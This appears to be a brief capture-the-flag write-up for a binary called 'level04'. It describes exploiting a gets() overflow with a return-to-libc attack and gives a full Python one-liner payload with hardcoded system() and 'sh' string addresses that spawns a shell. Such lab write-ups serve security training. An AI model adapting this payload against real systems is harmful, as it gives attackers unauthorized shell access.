after decompiling the binary we found a call to `gets()` in a child proccess
we use it to overwrite `main()`'s return address with libc's `system()` address
and write as parameter "sh" string extracted from the read-only string ".gnu.hash".
 

to do this we need to execute:

```
(python -c 'from struct import *; print "a"*156 + pack("I", 0xf7e6aed0) + "aaaa" + pack("I", 0x8048312)' ; cat) | ./level04
```

addresses meanings:
0xf7e6aed0: `system()` address
0x8048312: "sh" string address
